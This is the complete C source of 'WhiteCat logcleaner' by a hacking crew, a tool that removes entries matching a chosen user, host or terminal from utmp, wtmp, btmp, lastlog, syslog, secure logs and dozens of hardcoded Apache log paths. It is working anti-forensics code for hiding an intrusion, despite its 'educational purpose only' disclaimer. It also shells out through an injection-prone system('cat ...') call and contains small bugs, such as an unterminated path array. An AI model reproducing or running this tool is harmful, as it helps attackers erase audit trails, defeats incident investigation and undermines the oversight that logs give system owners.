/*
 *  This is WhiteCat logcleaner version 1.1 by ShadOS [Pashkela edition - with apache log files]
    from Hell Knights Crew. [FreeBSD, Linux, SOLARIS supported]
 *  It supports perl compatible regular expressions and cleans any binary and 
 *  text log files (just correct source a little). WhiteCat is designed for 
 *  any UNIX-like system, but tested only on GNU/Linux and FreeBSD. 
 *  Distributed under GPLv2. Use it only for educational purpose only. 
 *  Thanks to Ivan Sklyaroff for his articles.
 *  Don't forget to visit our site and my homepage for new releases:
 *  http://hellknights.void.ru
 *  http://shados.0x48k.cc
 *  Also, you can mail me any bugs or suggestions:
 *  mailto: shados /at/ real /dot/ xakep /dot/ ru 
 *  mailto: shados /at/ 0x48k /dot/ cc
 *
 *  Copyright (C) 89, 90, 91, 1995-2007 Free Software Foundation.
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2, or (at your option)
 *  any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software Foundation,
 *  Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.  
 */ 
#define DEBUG
#include <stdio.h>
#include <sys/param.h>
#include <stdint.h>
#include <errno.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <pwd.h>
#include <string.h>
#include <regex.h>
#include <limits.h> /* for PATH_MAX */
#include <getopt.h>
#include <locale.h>
#include <utmp.h>
#ifdef SUNOS
#include <utmpx.h>
#include <lastlog.h>
#endif 
/* APACHE access & error logs paths*/
char *APACHE_PATH[]=
{
"/apache/logs/error.log",
"/apache/logs/access.log",
"/apache2/logs/error.log",
"/apache2/logs/access.log",
"/logs/error.log",
"/logs/access.log",
"/usr/local/apache/logs/access_log",
"/usr/local/apache/logs/access.log",
"/usr/local/apache/logs/error_log",
"/usr/local/apache/logs/error.log",
"/usr/local/apache2/logs/access_log",
"/usr/local/apache2/logs/access.log",
"/usr/local/apache2/logs/error_log",
"/usr/local/apache2/logs/error.log",
"/var/www/logs/access_log",
"/var/www/logs/access.log",
"/var/www/logs/error_log",
"/var/www/logs/error.log",
"/var/log/httpd/access_log",
"/var/log/httpd/access.log",
"/var/log/httpd/error_log",
"/var/log/httpd/error.log",
"/var/log/apache/access_log",
"/var/log/apache/access.log",
"/var/log/apache/error_log",
"/var/log/apache/error.log",
"/var/log/apache2/access_log",
"/var/log/apache2/access.log",
"/var/log/apache2/error_log",
"/var/log/apache2/error.log",
"/var/log/access_log",
"/var/log/access.log",
"/var/log/error_log",
"/var/log/error.log",
"/opt/lampp/logs/access_log",
"/opt/lampp/logs/error_log",
"/opt/lampp/logs/access.log",
"/opt/lampp/logs/error.log",
"/opt/xampp/logs/access_log",
"/opt/xampp/logs/error_log",
"/opt/xampp/logs/access.log",
"/opt/xampp/logs/error.log",
"/logs/error_log",
"/logs/access_log",
"/etc/httpd/logs/acces_log",
"/etc/httpd/logs/acces.log",
"/etc/httpd/logs/error_log",
"/etc/httpd/logs/error.log",
"/var/log/access_log",
"/var/log/access.log",
"/var/log/error_log",
"/var/log/error.log"
};
/* SOLARIS */
#ifdef SUNOS
 #ifndef LASTLOG_FILE
   #define LASTLOG_FILE "/var/adm/lastlog"
 #endif
 #ifndef BTMPX_FILE
   #define BTMPX_FILE "/var/adm/btmpx"
 #endif
#else
/* Linux, FreeBSD */
 #ifndef UTMP_FILE
   #ifndef _PATH_UTMP
     #define UTMP_FILE "/var/run/utmp"
   #else
     #define UTMP_FILE _PATH_UTMP
   #endif
#endif
#ifndef WTMP_FILE
  #ifndef _PATH_WTMP
    #define WTMP_FILE "/var/log/wtmp"
  #else
    #define WTMP_FILE _PATH_WTMP
  #endif
#endif
#ifndef LASTLOG_FILE
 #ifndef _PATH_LASTLOG
   #define LASTLOG_FILE "/var/log/lastlog"
 #else
   #define LASTLOG_FILE _PATH_LASTLOG
 #endif
#endif
#ifndef BTMP_FILE
  #ifndef _PATH_BTMP
    #define BTMP_FILE "/var/log/btmp"
  #else
    #define BTMP_FILE _PATH_BTMP
  #endif
#endif
#endif
//modify parametrs as in your box ;)
#ifdef SUNOS
  #define SYSLOG_FILE "/var/log/syslog"
#else
  #define SYSLOG_FILE "/var/log/messages"
#endif
#define SECURE_FILE "/var/log/secure"
#define MAXBUFF 8*1024
#define PROGRAM_NAME "WhiteCat logcleaner"
#define PROGRAM_VERSION 1.1
#define PROGRAM_RELEASE 1
#define AUTHORS "Shad0S [Hell Knights Crew]"

char *myname; /* for error messages */
int do_ignorecase = 0; /* -i option: ignore case */
int do_extended = 0; /* -E option: use extended RE's */
int do_username = 0;
int do_hostname = 0;
int do_tty = 0;
int errors = 0; /* number of errors */
/* patterns to match */
regex_t username;
regex_t hostname;
regex_t tty;

int copy_tmp(char *dstfilename, char *tmpfilename);
int clear_textlog(char *filename);
int clear_uwbtmp(char *filename);
int clear_lastlog (char *filename);
regex_t compile_pattern(const char *pat);
int process_regexp(regex_t *pattern, char *buf, size_t size);
char *xgethostname(void);
void usage(void);
void version(void);

int main(int argc, char *argv[]){
  myname = argv[0];
  char c;
  struct stat statbuf; //buffer for stat()
/* i18n */
//setlocale (LC_ALL, "");
//struct lconv l = *localeconv();
//l.decimal_point = ".";

struct option longopts[]={
{ "user", required_argument, &do_username, 'u'},
{ "tty", required_argument, &do_tty, 't'},
{ "hostname", required_argument, &do_hostname, 'a'},
{ "extended", no_argument, &do_extended, 'e'},
{ "ignore", no_argument, &do_ignorecase, 'i'},
{ "help", no_argument, NULL, 'h'},
{ "version", no_argument, NULL, 'V'},
{ 0, 0, 0, 0 }
};

if ((argc < 2) || (argc > 18)) {
  version();
  usage();
}
while ((c=getopt_long(argc,argv,"u:t:a:reihVW;",longopts,NULL)) != -1) {
  switch (c) {
   case 'u':
    username = compile_pattern(optarg);
    if (errors) usage(); //compile failed
     do_username=1;
    break;
   case 't':
    tty = compile_pattern(optarg);
    if (errors) usage(); //compile failed
     do_tty=1;
    break;
   case 'a':
    hostname = compile_pattern(optarg);
    if (errors) usage(); //compile failed
     do_hostname=1; 
    break;
   case 'e':
    do_extended = 1;
    break; 
   case 'i':
    do_ignorecase = 1;
   break;
   case 'h':
    version();
    usage(); 
   case 'V':
    version();
    exit(0);
   break;
   case 0:
    break;
   case ':':
    fprintf(stderr, "%s: option '-%c' requires an argument\n", myname, optopt);
    usage(); 
   case '?':
    default:
    fprintf(stderr, "%s: option '-%c' is invalid\n", myname, optopt);
    usage(); 
   } 
}
//sanity check
if (!do_username && !do_tty && !do_hostname){
   fprintf(stderr, "%s: did not found any parametr to clean (username, hostname, tty)!\n", myname);
   usage();
} 

version();

#ifdef SUNOS
  if (!clear_uwbtmp(UTMPX_FILE))
   printf("\033[1mutmp cleaning \t\t\t\t\t\t\t \033[32;1m[ OK ] \033[0m\n");
  if (!clear_uwbtmp(WTMPX_FILE))
   printf("\033[1mwtmp cleaning \t\t\t\t\t\t\t \033[32;1m[ OK ] \033[0m\n");
  /* we able to get file attributes, so BTMPX_FILE obviously exists */
  if (stat(BTMPX_FILE, &statbuf) == 0) 
   if (!clear_uwbtmp(BTMPX_FILE))
    printf("\033[1mbtmp cleaning \t\t\t\t\t\t\t \033[32;1m[ OK ] \033[0m\n");
#else 
  if (!clear_uwbtmp(UTMP_FILE))
    printf("\033[1mutmp cleaning \t\t\t\t\t\t\t \033[32;1m[ OK ] \033[0m\n");
  if (!clear_uwbtmp(WTMP_FILE))
    printf("\033[1mwtmp cleaning \t\t\t\t\t\t\t \033[32;1m[ OK ] \033[0m\n");
  /* we able to get file attributes, so BTMP_FILE obviously exists */
  if (stat(BTMP_FILE, &statbuf) == 0)
   if (!clear_uwbtmp(BTMP_FILE))
    printf("\033[1mbtmp cleaning \t\t\t\t\t\t\t \033[32;1m[ OK ] \033[0m\n");
#endif
if (!clear_lastlog(LASTLOG_FILE))
  printf("\033[1mlastlog cleaning \t\t\t\t\t\t \033[32;1m[ OK ] \033[0m\n");
if (!clear_textlog(SYSLOG_FILE))
  printf("\033[1msyslog cleaning \t\t\t\t\t\t \033[32;1m[ OK ] \033[0m\n");
if (stat(SECURE_FILE, &statbuf) == 0) //we able to get file attributes, so SECURE_FILE obviously exists
  if (!clear_textlog(SECURE_FILE))
    printf("\033[1msecure cleaning \t\t\t\t\t\t \033[32;1m[ OK ] \033[0m\n");
/*APACHE LOGS */
int ii=0;
while (APACHE_PATH[ii]!=NULL){
  if (!clear_textlog(APACHE_PATH[ii]))
    printf("\033[1mapache logs cleaning \t\t\t\t\t\t\t \033[32;1m[   OK   ] \033[0m\n");
    ii++;
}
/* END APACHE LOGS */
return 0;
}
/* replace logfile with tempfile */
int copy_tmp(char *dstfilename, char *tmpfilename)
{
char buffer[BUFSIZ];

sprintf(buffer, "cat %s > %s", tmpfilename, dstfilename);
#ifdef DEBUG
printf("%s\n", buffer);
#endif

if (system(buffer) < 0) {
printf("Error copying from tempfile!");
return 0x48;
}
unlink(tmpfilename);
//sprintf(buffer, "rm %s", tmpfilename);
}


/* cleanup plaintext logfiles */
int clear_textlog(char *filename)
{
char buftmp[MAXBUFF];
FILE *fd;
int fdtmp;
int found = 0;
int errors = 0;
ssize_t rcnt, wcnt;
static char template[] = "tmpfileXXXXXX";
char ftmpname[PATH_MAX];
char *localhostname;
char *tmpdir;

if (do_username)
if ((localhostname = xgethostname()) == NULL) {
fprintf(stderr, "%s: could not determine hostname: %s\n", myname, strerror(errno));
return 0x48; 
}
else {
if (process_regexp(&username, localhostname, strlen(localhostname)))
fprintf(stdout, "%s: warning: local hostname (%s) is like the username string!\n", myname, localhostname, username);
}

if ((fd = fopen(filename, "r")) == 0) {
 /*fprintf(stderr, "%s: %s: could not open: %s\n", myname, filename, strerror(errno));*/
return 0x48;
}

//get TMPDIR value, else use "/tmp"
if ((tmpdir = getenv("TMPDIR")) == NULL)
tmpdir = "/tmp";
sprintf(ftmpname, "%s/%s", tmpdir, template);
if ((fdtmp = mkstemp(ftmpname)) == -1) {
fprintf(stderr, "%s: %s: could not create temp file: %s\n", myname, filename, strerror(errno));
return 0x48;
}

//while ((rcnt = getline(&buftmp, &rcnt, fd)) != -1)
while (fgets(buftmp, MAXBUFF, fd) != NULL)
{
//length of null-terminated string 
rcnt = strlen(buftmp);
if (do_hostname) found = process_regexp(&hostname, buftmp, rcnt); 
if (do_username) found = process_regexp(&username, buftmp, rcnt); 
if (do_tty) found = process_regexp(&tty, buftmp, rcnt); 
if (!found) { 
wcnt = write(fdtmp, buftmp, rcnt);
if (wcnt != rcnt) {
fprintf(stderr, "%s: %s: write error: %s\n", myname, ftmpname, strerror(errno));
errors++;
break;
}
}
found = 0;
}
if ((rcnt < 0) && (errno != EXIT_SUCCESS)) {
fprintf(stderr, "%s: %s: read error: %s\n", myname, filename, strerror(errno));
errors++;
}
if (fd != 0) {
if (fclose(fd) < 0) {
fprintf(stderr, "%s: %s: close error: %s\n", myname, filename, strerror(errno));
errors++;
}
}
if (fdtmp != 0) {
if (close(fdtmp) < 0) {
fprintf(stderr, "%s: %s: close error: %s\n", myname, ftmpname, strerror(errno));
errors++;
}
}

copy_tmp(filename, ftmpname);

return (errors != 0);
}
/* cleanup binary log entries */
int clear_uwbtmp(char *filename)
{
#ifndef SUNOS
struct utmp entry;
#else
struct utmpx entry;
#endif
int fd;
int fdtmp;
int found = 0;
int errors = 0;
ssize_t rcnt, wcnt;
static char template[] = "tmpfileXXXXXX";
char ftmpname[PATH_MAX];
char *tmpdir;
if ((fd = open(filename, O_RDONLY)) == -1) {
 /*fprintf(stderr, "%s: %s: could not open: %s\n", myname, filename, strerror(errno));*/
return 0x48;
}
//get TMPDIR value, else use "/tmp"
if ((tmpdir = getenv("TMPDIR")) == NULL)
tmpdir = "/tmp";
sprintf(ftmpname, "%s/%s", tmpdir, template);
if ((fdtmp = mkstemp(ftmpname)) == -1) {
fprintf(stderr, "%s: %s: could not create temp file: %s\n", myname, filename, strerror(errno));
return 0x48;
}
while ((rcnt = read(fd, &entry, sizeof(struct utmp))) > 0)
{
#ifdef DEBUG
/*printf("line: %s\n", entry.ut_line);
printf("host: %s\n", entry.ut_host);
printf("name: %s\n", entry.ut_name);*/
#endif
if (do_hostname) found = process_regexp(&hostname, entry.ut_host, sizeof(entry.ut_host));
if (do_username) found = process_regexp(&username, entry.ut_name, sizeof(entry.ut_name));
if (do_tty) found = process_regexp(&tty, entry.ut_line, sizeof(entry.ut_line));
if (!found) { 
wcnt = write(fdtmp, &entry, sizeof(struct utmp));
if (wcnt != rcnt) {
fprintf(stderr, "%s: %s: write error: %s\n", myname, ftmpname, strerror(errno));
errors++;
break;
}
}
found = 0;
}
if (rcnt < 0) {
fprintf(stderr, "%s: %s: read error: %s\n", myname, filename, strerror(errno));
errors++;
}

if (fd != 0) {
if (close(fd) < 0) {
fprintf(stderr, "%s: %s: close error: %s\n", myname, filename, strerror(errno));
errors++;
}
}
if (fdtmp != 0) {
if (close(fdtmp) < 0) {
fprintf(stderr, "%s: %s: close error: %s\n", myname, ftmpname, strerror(errno));
errors++;
}
}
copy_tmp(filename, ftmpname);
return (errors != 0);
}
/* cleanup lastlog binary file with holes */
int clear_lastlog (char *filename)
{
struct passwd *pwd;
struct lastlog entry;
int uid = 0;
int found = 0;
int errors = 0;
int fd;
ssize_t rcnt, wcnt;

if ((fd = open(filename, O_RDWR)) < 0) {
 /*fprintf(stderr, "%s: %s: could not open: %s\n", myname, filename, strerror(errno));*/
return 0x48;
}

/* set position to the beginning of the file */
if (lseek(fd, (off_t)0, SEEK_SET) == (off_t)-1) {
fprintf(stderr, "%s: %s: could not set position in file: %s\n", myname, filename, strerror(errno));
return 0x48;
}

while ((rcnt = read(fd, &entry, sizeof(struct lastlog))) > 0)
{
if (do_username) {
if ((pwd = getpwuid(uid)) != NULL) 
found = process_regexp(&username, pwd->pw_name, sizeof(pwd->pw_name)); 
uid++;
}
if (do_hostname) found = process_regexp(&hostname, entry.ll_host, sizeof(entry.ll_host));
if (do_tty) found = process_regexp(&tty, entry.ll_line, sizeof(entry.ll_line)); 
if (found)
{
//XXX is this correct?
bzero(&entry, sizeof(struct lastlog));
found = 0;
}
if (lseek(fd, -(off_t)rcnt, SEEK_CUR) == (off_t)-1) {
fprintf(stderr, "%s: %s: could not set position in file: %s\n", myname, filename, strerror(errno));
return 0x48;
}
wcnt = write(fd, &entry, sizeof(struct lastlog));
if (wcnt != rcnt) {
fprintf(stderr, "%s: %s: write error: %s\n", myname, filename, strerror(errno));
errors++;
break;
}
}

if (rcnt < 0) {
fprintf(stderr, "%s: %s: read error: %s\n", myname, filename, strerror(errno));
errors++;
}

if (fd != 0) {
if (close(fd) < 0) {
fprintf(stderr, "%s: %s: close error: %s\n", myname, filename, strerror(errno));
errors++;
}
}

return (errors != 0);
}



/* compile the regex pattern */
regex_t compile_pattern(const char *pat)
{
int flags = REG_NOSUB; /* don't need where-matched info */
int ret;
regex_t pattern;
#define MSGBUFSIZE 512 /* arbitrary */
char error[MSGBUFSIZE];

if (do_ignorecase)
flags |= REG_ICASE;
if (do_extended)
flags |= REG_EXTENDED;

ret = regcomp(&pattern, pat, flags);
if (ret != 0) {
(void) regerror(ret, &pattern, error, sizeof error);
fprintf(stderr, "%s: pattern `%s': %s\n", myname, pat, error);
errors++;
}
else
return pattern;
}


/* process regular expression */
int process_regexp(regex_t *pattern, char *buf, size_t size)
{
char error[MSGBUFSIZE];
int ret;

if ((ret = regexec(pattern, buf, 0, NULL, 0)) != 0) {
if (ret != REG_NOMATCH) {
(void) regerror(ret, pattern, error, sizeof error);
fprintf(stderr, "%s: %s\n", myname, error);
errors++;
return 0;
}
return 0;
} 
else
return 1; 
}

#ifndef INITIAL_HOSTNAME_LENGTH
# define INITIAL_HOSTNAME_LENGTH 34
#endif

/* Return the current hostname in malloc'd storage.
If malloc fails, exit.
Upon any other failure, return NULL and set errno. */
char *xgethostname(void)
{
char *hostname = NULL;
size_t size = INITIAL_HOSTNAME_LENGTH;

while(1)
{
/* Use SIZE_1 here rather than SIZE to work around the bug in
SunOS 5.5's gethostname whereby it NUL-terminates HOSTNAME
even when the name is as long as the supplied buffer. */
size_t size_1;

hostname = realloc(hostname, size);
size_1 = size - 1;
hostname[size_1 - 1] = '\0';
errno = 0;

if (gethostname(hostname, size_1) == 0)
{
if (!hostname[size_1 - 1])
break;
}
else if (errno != 0 && errno != ENAMETOOLONG && errno != EINVAL
/* OSX/Darwin does this when the buffer is not large enough */
&& errno != ENOMEM)
{
int saved_errno = errno;
free(hostname);
errno = saved_errno;
return NULL;
}
}

return hostname;
}

/* print usage message and exit with 0x48k status */
void usage(void)
{
printf("Usage:\n");
printf("\t %s [-u user] [-t tty] [-a hostname|ipaddr] [OPTIONS]\n", myname);
printf("OPTIONS:\n");
printf("\t -i --ignore \t ignore case in regexps\n");
printf("\t -e --extended \t use extended regexps\n");
printf("\t -V --version \t show version info and exit\n");
printf("\t -h --help \t show this help screen and exit\n");
printf("\n");
exit(0x48);
}

/* print version information */
void version(void)
{
  fprintf(stdout, "\t =================================================================================================\n"); 
  fprintf(stdout, "\t = \033[1m%s %1.1f.%d by %s, 2007.\033[0m =\n", 
  PROGRAM_NAME, PROGRAM_VERSION, PROGRAM_RELEASE, AUTHORS "[Pashkela edition for rdot.org]");
  fprintf(stdout, "\t =================================================================================================\n"); 

}
